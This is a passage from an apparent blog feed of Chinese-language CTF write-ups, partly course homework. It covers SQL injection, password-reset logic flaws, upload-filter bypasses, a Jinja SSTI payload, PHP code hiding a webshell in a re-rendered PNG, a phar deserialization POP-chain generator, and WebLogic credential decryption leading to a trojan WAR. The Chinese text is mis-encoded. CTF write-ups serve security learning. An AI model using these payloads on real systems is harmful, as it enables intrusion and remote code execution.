src="/img/e1453df898e4722d88020a7bd249c304.png"></p><p>ä¹Ÿå¯ä»¥åœ¨è™šæ‹Ÿç»ˆç«¯å†…å¾—åˆ°flagï¼š</p><p><img src="/img/8e36f0ea7b1de9c3bf56f9f5eae721ba.png"></p><h2 id="ics-04-ï¼ˆéš¾åº¦4-10ï¼‰"><a href="#ics-04-ï¼ˆéš¾åº¦4-10ï¼‰" class="headerlink" title="ics-04 ï¼ˆéš¾åº¦4/10ï¼‰"></a>ics-04 ï¼ˆéš¾åº¦4/10ï¼‰</h2><p>è¿›å…¥ç™»å½•é¡µé¢åå‘ç°ä¸‰ä¸ªå…¥å£å¯èƒ½å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼šç™»å½•ã€æ³¨å†Œå’Œå¿˜è®°å¯†ç ï¼š</p><p><img src="/img/fff877e45ab9d177e18a60d14527e149.png"></p><p>äºæ˜¯é¦–å…ˆç”¨sqlmapæ‰«æç™»å½•é¡µé¢ï¼Œå‘ç°ä¸å­˜åœ¨sqlæ³¨å…¥ï¼š</p><p><img src="/img/f18b5dfa2d26c186405ec978905431d6.png"></p><p>åŒæ ·ï¼Œæ³¨å†Œé¡µé¢ä¹Ÿä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œä½†åœ¨å¿˜è®°å¯†ç é¡µé¢ï¼ŒæˆåŠŸæ‰«æå‡º4ä¸ªæ•°æ®åº“ï¼š</p><p><img src="/img/d715210161ac3cbb312864bea312da63.png"></p><p>å› ä¸ºè¯¥ç½‘ç«™åä¸ºcetcï¼Œæ‰€ä»¥é¦–å…ˆå°è¯•è®¿é—®è¯¥æ•°æ®åº“ã€‚è®¿é—®åå‘ç°åªæœ‰ä¸€ä¸ªuserè¡¨ï¼Œäºæ˜¯ç›´æ¥dumpã€‚ä¹‹åå‘ç°å¯†ç å·²ç»åŠ å¯†ï¼Œsqlmapçš„hashç ´è§£æ²¡æœ‰ä½œç”¨ï¼ˆåä¸¤ä¸ªç”¨æˆ·æ˜¯æˆ‘è‡ªå·±æ³¨å†Œçš„ï¼‰ï¼Œä½†æˆ‘ä»¬å¾—åˆ°äº†ç®¡ç†å‘˜ç”¨æˆ·å<code>c3tlwDmIn23</code>ï¼š</p><p><img src="/img/4f810777cb8e49cb6e63978ce139b27f.png"></p><p>åæ¥å°è¯•åå‘ç°è¯¥ç½‘ç«™ç”¨æˆ·è®¿é—®æ§åˆ¶ç³»ç»Ÿå­˜åœ¨é€»è¾‘æ¼æ´ï¼Œå¯ä»¥é‡å¤æ³¨å†ŒåŒä¸€ä¸ªç”¨æˆ·åï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥æ³¨å†Œ<code>c3tlwDmIn23</code>ï¼Œä¾¿å¯ä»¥å¾—åˆ°ç®¡ç†å‘˜æƒé™ã€‚</p><p>æ³¨å†ŒåæˆåŠŸç™»å½•ï¼Œä¾¿å¾—åˆ°flagï¼š<code>cyberpeace&#123;7de7a525272f7a3463d04739e971fc9b&#125;</code>ã€‚</p><p><img src="/img/f931eb8fccbd887628c1de4b24e06195.png"></p><h2 id="bug-ï¼ˆéš¾åº¦ï¼š5-10ï¼‰"><a href="#bug-ï¼ˆéš¾åº¦ï¼š5-10ï¼‰" class="headerlink" title="bug ï¼ˆéš¾åº¦ï¼š5/10ï¼‰"></a>bug ï¼ˆéš¾åº¦ï¼š5/10ï¼‰</h2><p>é¦–å…ˆå°è¯•æ³¨å†Œadminè´¦æˆ·ï¼Œå‘ç°è´¦å·å·²å­˜åœ¨ã€‚äºæ˜¯å…ˆæ³¨å†Œä¸€ä¸ªtestè´¦å·ï¼š</p><p><img src="/img/0a87565bab6dad4d36f218c2782a9545.png"></p><p>ä½†æ™®é€šè´¦å·è¿›å…¥åæ— æ³•æ‰“å¼€manageé€‰é¡¹å¡ï¼Œäºæ˜¯å°è¯•å¯»æ‰¾ä¿®æ”¹å¯†ç æ¨¡å—çš„é€»è¾‘æ¼æ´ã€‚å°è¯•Findpwdï¼Œç„¶åç”¨Burp SuiteæŠ“åŒ…ï¼Œå‘ç°æœ‰usernameçš„ä¿¡æ¯ï¼Œä¿®æ”¹ä¸ºadminï¼š</p><p><img src="/img/9d2f94bcd4f25358152322c0e256cd55.png"></p><p><img src="/img/b6a30b8f82edc53f2579e6ddda92c795.png">æç¤ºä¿®æ”¹æˆåŠŸï¼š</p><p><img src="/img/8e6d64ae0dea0aa890fbd6d0a2be3072.png"></p><p>æˆåŠŸè¿›å…¥adminè´¦æˆ·ï¼Œä½†åœ¨è¿›å…¥manageç•Œé¢æ—¶æç¤ºIPä¸å…è®¸ï¼Œåªéœ€è¦æŠ“åŒ…ç„¶ååŠ ä¸Š<code>X-Forwarded-For: 127.0.0.1</code>å³å¯ã€‚</p><p><img src="/img/d7d300fa8f0c50d4bb20c3859e47d4a6.png"></p><p>è¿›å…¥ä¹‹åæ‰“å¡æ£€æŸ¥å…ƒç´ ï¼Œå‘ç°é¡µé¢æ³¨é‡Šæœ‰æç¤ºï¼š</p><p><img src="/img/9e575230738b3c495d081f99b5a404a3.png"></p><p>å¦‚æœç›´æ¥è®¿é—®è¿™ä¸ªç½‘å€ä¼šæç¤ºAction is not correctï¼åªéœ€è¦æŠŠ???æ”¹æˆuploadå³å¯ã€‚</p><p><img src="/img/1366fb99b6041c8d547fa144d924fd87.png"></p><p>å¦‚æœç›´æ¥ä¸Šä¼ phpæ–‡ä»¶çš„è¯ä¼šæŠ¥é”™ï¼Œå¦‚æœç›´æ¥ä¿®æ”¹MIMEä¹Ÿä¸è¡Œï¼Œå› ä¸ºä¼šæ£€æŸ¥æ–‡ä»¶å†…çš„<code>&lt;php&gt;</code>æ ‡ç­¾ã€‚è¿™é‡Œéœ€è¦ç”¨scriptæ¨¡å¼ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªå†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriptÂ language=&#x27;php&#x27;&gt;helloworld_php_script&lt;/script&gt;Â Â </span><br></pre></td></tr></table></figure><p>çš„jpgæ–‡ä»¶ï¼Œç„¶åç”¨Burp Suite æŠ“åŒ…ï¼š</p><p><img src="/img/ed37f367c815522cc62e05edf4b2deef.png">Sendåå¾—åˆ°flagï¼š<code>cyberpeace&#123;e788ce13e8255b0068e72bcf476453ec&#125;</code>ã€‚</p><p><img src="/img/78da8241a87b9d1ce7fa2cee3fa713ec.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note info flat&quot;&gt;&lt;p&gt;æœ¬æ–‡æ˜¯ã€Šç½‘ç»œå®‰å…¨è¯¾ç¨‹è®¾è®¡ã€‹çš„ä¸€é¡¹ä»»åŠ¡&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;robots&quot;&gt;&lt;a href=&quot;#robots&quot; class=&quot;headerlink&quot; title=&quot;robots&quot;&gt;&lt;/a&gt;robots</summary>
      
    
    
    
    
    <category term="è¯¾ç¨‹ä½œä¸š" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    <category term="CTF" scheme="https://zxy.link/tags/CTF/"/>
    
    <category term="Web" scheme="https://zxy.link/tags/Web/"/>
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://zxy.link/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ”»é˜²ä¸–ç•Œ" scheme="https://zxy.link/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF-2021ç§‹å­£èµ›éƒ¨åˆ†é¢˜è§£</title>
    <link href="https://zxy.link/posts/dae2f53a/"/>
    <id>https://zxy.link/posts/dae2f53a/</id>
    <published>2021-10-06T16:00:00.000Z</published>
    <updated>2022-01-22T12:43:07.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>ç»è¿‡å¤šæ¬¡å°è¯•å‘ç°requestè¢«ç¦ç”¨ï¼Œäºæ˜¯æ„é€ payloadç›´æ¥ç»™ä¸åŒå˜é‡èµ‹å€¼ï¼Œæ‹¼æ¥æˆæœ€åçš„<code>file=&#39;/flag&#39;</code>å‘½ä»¤ã€‚è¿™é‡Œç›´æ¥æ”¾payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|<span class="keyword">string</span>|<span class="keyword">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">102</span>)%<span class="number">2</span>bchr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">103</span>)%&#125;</span><br><span class="line">&#123;%<span class="keyword">print</span>(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>åœ¨<a href="http://219.219.61.234:7777/robots.txt%E5%8F%91%E7%8E%B0hint%EF%BC%9A">http://219.219.61.234:7777/robots.txtå‘ç°hintï¼š</a></p><p><img src="/img/image-20211007172344153.png" alt="image-20211007172344153"></p><p>è¿›å…¥åå‘ç°ä¸Šä¼ é¡µé¢ã€‚å¤šæ¬¡å°è¯•åœ¨å›¾ç‰‡ä¸­åŒ…å«å°é©¬ä½†è¢«ç³»ç»Ÿæç¤ºï¼šçœŸçš„æ˜¯å›¾ç‰‡å—? äºæ˜¯å†æ¬¡å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´ç­‰æ–¹å¼å‡æ— æ•ˆï¼Œæœ€åæ€€ç–‘æ˜¯è°ƒç”¨äº†<code>imagecreatefrom</code>å‡½æ•°è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ã€‚äºæ˜¯ä½¿ç”¨å¦‚ä¸‹phpä»£ç åˆ¶ä½œä¸€å¼ äºŒæ¬¡æ¸²æŸ“åæ¶æ„ä»£ç ä»å­˜åœ¨çš„pngæ–‡ä»¶ã€‚è¿™æ®µä»£ç èƒ½å°†å°é©¬éšè—åœ¨ä¸€å¼ æ­£å¸¸å›¾ç‰‡ä¹‹ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤è¡Œæ‰§è¡Œphpä»£ç ï¼Œå¾—åˆ°<code>1.png</code>ï¼Œä¸Šä¼ åæˆåŠŸè¢«ç³»ç»Ÿacceptã€‚</p><p>æ¥ä¸‹æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è°ƒç”¨ä¸Šä¼ çš„å°é©¬ï¼špayloadï¼š<a href="http://219.219.61.234:7777/?0=system&amp;file=./upload/413110900.png%EF%BC%8C%E7%84%B6%E5%90%8Epost">http://219.219.61.234:7777/?0=system&amp;file=./upload/413110900.pngï¼Œç„¶åpost</a> <code>1=cat /flag</code></p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211002223439.png" alt="QQæˆªå›¾20211002223439"></p><p>å¾—åˆ°flagã€‚<img src="/img/QQ%E6%88%AA%E5%9B%BE20211002223421.png" alt="QQæˆªå›¾20211002223421"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>é¦–å…ˆåœ¨show fileé¡µé¢è¾“å…¥<code>index.php</code>å¾—åˆ°éƒ¨åˆ†æºä»£ç ï¼š</p><p><img src="/img/image-20211007181142317.png" alt="image-20211007181142317"></p><p>ç”±<code>include &#39;base.php&#39;;</code>ï¼Œäºæ˜¯è¿›å…¥<a href="http://219.219.61.234:20022/file.php?file=base.php%EF%BC%8C%E4%BB%A5%E6%AD%A4%E6%96%B9%E6%B3%95%E5%8F%88%E5%BE%97%E5%88%B0%E4%BA%86%60class.php%60%E3%80%81%60file.php%60%E3%80%81%60upload.php%60%E3%80%81%60function.php%60%E7%9A%84%E6%BA%90%E7%A0%81%E3%80%82%E4%BB%8E%60function.php%60%E7%9A%84%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%82%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%9A">http://219.219.61.234:20022/file.php?file=base.phpï¼Œä»¥æ­¤æ–¹æ³•åˆå¾—åˆ°äº†`class.php`ã€`file.php`ã€`upload.php`ã€`function.php`çš„æºç ã€‚ä»`function.php`çš„ä»¥ä¸‹ä»£ç ä¸­å¯ä»¥å‘ç°æœåŠ¡å™¨å­˜å‚¨æ–‡ä»¶åçš„ç®—æ³•ï¼š</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        unlink(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å³å°†æ•´ä¸ªæ–‡ä»¶åç”¨md5åŠ å¯†ï¼Œç„¶ååŠ ä¸Šåç¼€.jpgï¼Œå­˜æ”¾åˆ°<code>upload/</code>ä¸­ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬æ ¹æ®<code>class.php</code>æ„é€ POPé“¾ç”Ÿæˆpharæ–‡ä»¶ï¼Œä¸»è¦åŸç†ï¼šåˆ©ç”¨Fileç±»<code>__destruct()</code>ä¸­çš„<code>echo $this-&gt;file;</code>è¯­å¥â€”&gt;è°ƒç”¨Dockerç±»çš„ <code>__toString()</code>å‡½æ•°â€”&gt;è°ƒç”¨Cloudç±»ä¸­çš„<code>get_file()</code>å‡½æ•°å¾—åˆ°<code>/flag</code>ã€‚åˆ©ç”¨ä»¥ä¸‹ä»£ç ç”Ÿæˆpharæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span> = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$do</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$fi</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$cl</span> =<span class="keyword">new</span> Cloud();</span><br><span class="line"><span class="variable">$do</span>-&gt;str = <span class="variable">$cl</span>;</span><br><span class="line"><span class="variable">$fi</span>-&gt;fakefile = <span class="variable">$do</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;exp9.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$fi</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸä¸Šä¼ ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è®¿é—®pharæ–‡ä»¶ï¼Œå¾—åˆ°flagã€‚payloadï¼š<a href="http://219.219.61.234:20022/file.php?file=phar://upload/173d9a103870c14d86fdb93129ee7d9c.jpg">http://219.219.61.234:20022/file.php?file=phar://upload/173d9a103870c14d86fdb93129ee7d9c.jpg</a></p><p><img src="/img/image-20211007180941116.png" alt="image-20211007180941116"></p><p>base64è§£ç å¾—åˆ°flagã€‚</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>é¦–å…ˆå°è¯•å¼±å£ä»¤ï¼Œæ— æ•ˆã€‚äºæ˜¯è¿›è¡Œè§£å¯†ã€‚</p><p>è®¾ç½®è·¯å¾„ä¸º./security/SerializedSystemIni.datï¼Œä½¿ç”¨Burp SuiteæŠ“åŒ…ï¼Œå°†ä¹±ç éƒ¨åˆ†æ‹·è´ä¸ºæ–‡ä»¶ï¼Œå‘½åä¸º1.datã€‚</p><p><img src="/img/image-20211007201027297.png" alt="image-20211007201027297"></p><p>åŒç†ï¼Œè®¾ç½®è·¯å¾„ä¸º./config/config.xmlï¼Œå¾—åˆ°åŠ å¯†åçš„ç®¡ç†å‘˜å¯†ç ä¸º<code>&#123;AES&#125;9VgweUmigT7OjfK/quYRTd947tkcRiSnnQ1qxe1Sp/c2rUwn65ISTNaLPLxE9xLU</code></p><p>åˆ©ç”¨weblogicæ§åˆ¶å°è§£å¯†å·¥å…·å¾—åˆ°ç®¡ç†å‘˜å¯†ç ï¼š</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211007125314.png" alt="QQæˆªå›¾20211007125314"></p><p>è¿›å…¥éƒ¨ç½²é¡µé¢</p><p><img src="/img/image-20211007201410823.png" alt="image-20211007201410823"></p><p>ä¸Šä¼ test0000.waræœ¨é©¬æ–‡ä»¶ï¼Œä¿å­˜éƒ¨ç½²ï¼š</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211007131921.png" alt="QQæˆªå›¾20211007131921"></p><p>è®¿é—®è¯¥æœ¨é©¬ï¼Œè¿›å…¥æ–‡ä»¶ç®¡ç†é¡µé¢ï¼Œä¸æ–­è¿›å…¥ä¸Šå±‚ç›®å½•ï¼Œå‘ç°flag.tarï¼Œä½†ä¸ºç©ºã€‚äºæ˜¯ç»§ç»­è¿›å…¥ä¸Šå±‚ç›®å½•ï¼Œå‘ç°å¯ç–‘æ–‡ä»¶ï¼š</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211007131830.png" alt="QQæˆªå›¾20211007131830"></p><p>ä¸‹è½½å¹¶ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå¾—åˆ°flagã€‚</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="åŠ å¯†ï¼Ÿ"><a href="#åŠ å¯†ï¼Ÿ" class="headerlink" title="åŠ å¯†ï¼Ÿ"></a>åŠ å¯†ï¼Ÿ</h2><p>ç¬¬ä¸€å±‚ï¼šæ˜¾ç„¶æ˜¯ç¦å°”æ‘©æ–¯é‡Œçš„è·³èˆçš„å°äººï¼Œå¯†ç ï¼šSHERLOCK</p><p><img src="/img/%E5%AF%86%E7%A0%81.png" alt="å¯†ç "></p><p>è¿›å…¥å‹ç¼©åŒ…å¤‡æ³¨ä¸­çš„ç½‘ç«™ï¼Œå‘ç°æ˜¯é›¶å®½åº¦å­—ç¬¦è§£ç ç½‘ç«™ã€‚åœ¨Windowsä¸­æ‰“å¼€å‹ç¼©åŒ…ä¸­çš„<code>å¯†ç .txt</code>ï¼Œæ— æ³•è¯»å–é›¶å®½åº¦å­—ç¬¦ï¼Œäºæ˜¯åˆ°linuxç³»ç»Ÿä¸­ç”¨vimè¯»å–ï¼Œå¹¶copyåˆ°è§£ç ç½‘ç«™ï¼Œå¾—åˆ°å‹ç¼©å¯†ç ï¼š</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211005182316.png" alt="QQæˆªå›¾20211005182316"></p><p>æ‰“å¼€flag.txtï¼Œä½¿ç”¨base16è§£ç å¾—åˆ°flagã€‚</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211005182340.png" alt="QQæˆªå›¾20211005182340"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;ssti&quot;&gt;&lt;a href=&quot;#ssti&quot; class=&quot;headerlink&quot; title=&quot;ssti&quot;&gt;&lt;/a&gt;sst</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://zxy.link/tags/CTF/"/>
    
    <category term="Web" scheme="https://zxy.link/tags/Web/"/>
    
    <category term="Misc" scheme="https://zxy.link/tags/Misc/"/>
    
  </entry>
  
</feed>
